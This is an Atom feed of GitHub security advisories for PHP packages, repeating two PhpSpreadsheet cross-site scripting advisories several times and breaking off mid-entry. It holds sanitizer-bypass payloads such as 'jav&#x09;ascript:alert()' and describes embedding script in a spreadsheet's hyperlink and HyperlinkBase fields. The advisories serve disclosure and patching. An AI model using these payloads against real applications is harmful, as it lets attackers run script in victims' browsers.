<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2025-01-06T03:07:55.510Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters]]></title>
        <id>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</id>
        <link href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r"/>
        <updated>2025-01-03T19:25:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters">Bypass XSS sanitizer using the javascript protocol and special characters</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateRow</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>
<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 6. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.
The Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>
<p><img alt="fig11" src="https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd"></p>
<p><em>Figure 11. Using the javascript protocol with special characters</em></p>
<p>Some payloads help bypass the security system and carry out a XSS attack.</p>
<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>jav&amp;#x09;ascript:alert()
jav&amp;#x0D;ascript:alert()
jav&amp;#x0A;ascript:alert()
</code></pre>
<p>It's clear that the javascript protocol with special characters is used. </p>
<p><img alt="fig12" src="https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479"></p>
<p><em>Figure 12. Using the javascript protocol with special characters</em></p>
<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>
<img src="https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26" alt="fig13" width="373">

<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56412">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>
<li><a href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters]]></title>
        <id>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</id>
        <link href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r"/>
        <updated>2025-01-03T19:25:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters">Bypass XSS sanitizer using the javascript protocol and special characters</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateRow</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>
<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 6. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.
The Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>
<p><img alt="fig11" src="https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd"></p>
<p><em>Figure 11. Using the javascript protocol with special characters</em></p>
<p>Some payloads help bypass the security system and carry out a XSS attack.</p>
<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>jav&amp;#x09;ascript:alert()
jav&amp;#x0D;ascript:alert()
jav&amp;#x0A;ascript:alert()
</code></pre>
<p>It's clear that the javascript protocol with special characters is used. </p>
<p><img alt="fig12" src="https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479"></p>
<p><em>Figure 12. Using the javascript protocol with special characters</em></p>
<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>
<img src="https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26" alt="fig13" width="373">

<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56412">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>
<li><a href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters]]></title>
        <id>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</id>
        <link href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r"/>
        <updated>2025-01-03T19:25:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters">Bypass XSS sanitizer using the javascript protocol and special characters</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateRow</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>
<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 6. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.
The Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>
<p><img alt="fig11" src="https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd"></p>
<p><em>Figure 11. Using the javascript protocol with special characters</em></p>
<p>Some payloads help bypass the security system and carry out a XSS attack.</p>
<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>jav&amp;#x09;ascript:alert()
jav&amp;#x0D;ascript:alert()
jav&amp;#x0A;ascript:alert()
</code></pre>
<p>It's clear that the javascript protocol with special characters is used. </p>
<p><img alt="fig12" src="https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479"></p>
<p><em>Figure 12. Using the javascript protocol with special characters</em></p>
<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>
<img src="https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26" alt="fig13" width="373">

<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56412">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>
<li><a href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters]]></title>
        <id>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</id>
        <link href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r"/>
        <updated>2025-01-03T19:25:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters">Bypass XSS sanitizer using the javascript protocol and special characters</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateRow</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>
<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 6. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.
The Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>
<p><img alt="fig11" src="https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd"></p>
<p><em>Figure 11. Using the javascript protocol with special characters</em></p>
<p>Some payloads help bypass the security system and carry out a XSS attack.</p>
<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>jav&amp;#x09;ascript:alert()
jav&amp;#x0D;ascript:alert()
jav&amp;#x0A;ascript:alert()
</code></pre>
<p>It's clear that the javascript protocol with special characters is used. </p>
<p><img alt="fig12" src="https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479"></p>
<p><em>Figure 12. Using the javascript protocol with special characters</em></p>
<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>
<img src="https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26" alt="fig13" width="373">

<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56412">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>
<li><a href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header]]></title>
        <id>https://github.com/advisories/GHSA-hwcp-2h35-p66w</id>
        <link href="https://github.com/advisories/GHSA-hwcp-2h35-p66w"/>
        <updated>2025-01-03T19:24:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateHTMLHeader</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 8. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>
<p><img alt="fig14" src="https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3"></p>
<p><em>Figure 14. Embedding the payload</em> </p>
<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig15" src="https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba"></p>
<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>
<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.
<img src="https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5" alt="fig16" width="356"></p>
<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56411">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>
<li><a href="https://github.com/advisories/GHSA-hwcp-2h35-p66w">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwcp-2h35-p66w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header]]></title>
        <id>https://github.com/advisories/GHSA-hwcp-2h35-p66w</id>
        <link href="https://github.com/advisories/GHSA-hwcp-2h35-p66w"/>
        <updated>2025-01-03T19:24:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateHTMLHeader</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 8. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>
<p><img alt="fig14" src="https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3"></p>
<p><em>Figure 14. Embedding the payload</em> </p>
<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig15" src="https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba"></p>
<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>
<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.
<img src="https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5" alt="fig16" width="356"></p>
<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56411">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>
<li><a href="https://github.com/advisories/GHSA-hwcp-2h35-p66w">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwcp-2h35-p66w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header]]></title>
        <id>https://github.com/advisories/GHSA-hwcp-2h35-p66w</id>
        <link href="https://github.com/advisories/GHSA-hwcp-2h35-p66w"/>
        <updated>2025-01-03T19:24:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateHTMLHeader</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 8. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>
<p><img alt="fig14" src="https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3"></p>
<p><em>Figure 14. Embedding the payload</em> </p>
<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig15" src="https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba"></p>
<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>
<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.
<img src="https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5" alt="fig16" width="356"></p>
<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>
